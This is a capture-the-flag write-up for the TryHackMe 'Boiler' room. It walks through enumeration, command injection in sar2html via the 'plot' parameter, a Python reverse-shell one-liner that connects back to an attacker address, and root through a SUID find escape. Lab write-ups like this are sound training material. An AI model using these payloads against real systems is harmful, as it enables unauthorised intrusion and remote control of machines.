# Boiler CTF [TryHackMe](https://tryhackme.com/room/boilerctf2)

---

![](./.assets/logo.jpeg)

---

## Index

- [Enumeration](#enumeration)
- [Finding vunerabilities](#finding-vunerabilities)
- [Priviledge Escalation](#priviledge-escalation)
- [Final Thoughts](#final-thoughts)

---

```bash
export IP=10.10.190.6 # I went through so many lol
```

### Enumeration

```bash
nmap -sC -sV -v -A $IP -oN nmap/initial.nmap
```

`Initial`
```
# Nmap 7.91 scan initiated Wed Jul 21 15:17:41 2021 as: nmap -vvv -p 21,80,10000,55007 -sC -A -sV -v -oN nmap/initial.nmap 10.10.190.6
Nmap scan report for 10.10.190.6
Host is up, received syn-ack (0.18s latency).
Scanned at 2021-07-21 15:17:41 +04 for 103s

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:'<<IP>>'
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 9E85B5D6A09BB478578C67A5B7452FCB
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 21 15:19:24 2021 -- 1 IP address (1 host up) scanned in 103.08 seconds
```

nmap indicates that there is some sort of `robots.txt` file we can look at.

```txt
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

99b0660cd95adea327c54182baa51584
```

Before I access those directories, I decide to crack that cipher.
I first transform it from decimal to ASCII and from b64 decode it. Initially I thought it was hex but the hex to ASCII produced seemingly rubbish. However, the hash identifier seems to pick it up as a hash.
I use `hashcat` to crack the hash.

```bash
hashcat -m 0 -O '<<HASH>>' ~/wordlists/passwords/rockyou.txt --show
```

It is quickly cracked by hashcat and it seems to be a rabbit hole...
We can now move onto the directories listed in robots.txt

None of them worked. They were all a rabbit hole.

So we should move onto enumerating the website with `gobuster`

```bash
gobuster dir -t 32 -u $IP -w ~/wordlists/website/big.txt
```

```
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/joomla (Status: 301)
/manual (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

We have a CMS on this site: Joomla. Time to enumerate it!

```bash
gobuster dir -t 64 -u http://$IP/joomla -w ~/wordlists/website/big.txt
```

```txt
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/_archive (Status: 301)
/_database (Status: 301)
/_files (Status: 301)
/_test (Status: 301)
/administrator (Status: 301)
/bin (Status: 301)
/build (Status: 301)
/cache (Status: 301)
/cli (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/installation (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/templates (Status: 301)
/tests (Status: 301)
/tmp (Status: 301)
/~www (Status: 301)
```

The `_{filenames}` look interesting to me.

---

### Finding vunerabilities

Opening each one reveals...a rabbit hole! You'll find ciphers in them (which I decoded, they're relatively simple) but they all lead to _**rabbit holes**_. I do like them though, adds character to the box.

Well, all of them except one leads to a rabbit hole: `_test` is definitely something we can exploit because doing a quick google search on `sar2html` there are a variety of exploits which we can exploit.

I quickly find a promising python exploit (saved in `exploits/exploit.py` if you want to have a look at it) but rather than using that:

```python
output = sess.get(f"{url}/index.php?plot=;{cmd}")
try:
    out = re.findall("<option value=(.*?)>", output.text)
except:
    print ("Error!!")
```

All it is really doing is going to `index.php` and using `plot=;{cmd}` for the exploit.
(Also note, that the shebang line is incorrect - it should come first.)

Instead of that, I will use `curl`

```bash
curl "http://$IP/joomla/_test/index.php?plot=;whoami" | html2text
'% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                               Dload  Upload   Total   Spent    Left  Speed
0     0    0     0    0     0      0      0 --:--:-- -- 59  5805   59  3478    0     0   7868      0 --:--:-- --100  5805  100  5805    0     0  13133      0 --:--:-- --:--:-- --:--:-- 13103


                                 sar2html
                           (Donate if you like!)

  * New
  * ;whoami
        o HP-UX
        o Linux
        o SunOS

[One of: Select Host/HPUX/Linux/SunOS/www-data]
[One of: Select Host First]
[One of: Select Start Date First]'
```

Note, right there at the bottom, we can see the result of our command: `www-data`.

I craft up a simple python reverse-shell payload:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<<IP>>",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And add that to my curl request:

```bash
curl "http://$IP/joomla/_test/index.php?plot=;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<<IP>>',9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
```
And we are in!

---

### Priviledge Escalation

This was probably the easiest section of them all.
The directory in which we spawn in has a file: `log.txt` which contains a password.

Navigating to the home directory, we notice two users: `stoner` and `basterd`.
I find that we can `su basterd` with the password we found earlier and there's a script `backup.sh` we can read which contains the plaintext password of the _other_ user `stoner`.
`su stoner` and we now have the user flag!

Moving onto gaining root access, I grab linpeas and notice two major things: first we are part of the `lxd` group which can be exploited or even easier: the `find` SUID bit is set.

```bash
find . -exec /bin/bash -ip \;
```

And we are now root! And can grab the root flag!

---

### Final Thoughts

Fun room which tests your enumeration skills well. I had a few issues with the openvpn with this room (resolved by restarting the box now and again) but the room has a lot of merit (and rabbit holes). Would recommend!

---

![](./.assets/rabbit_holes.jpeg)
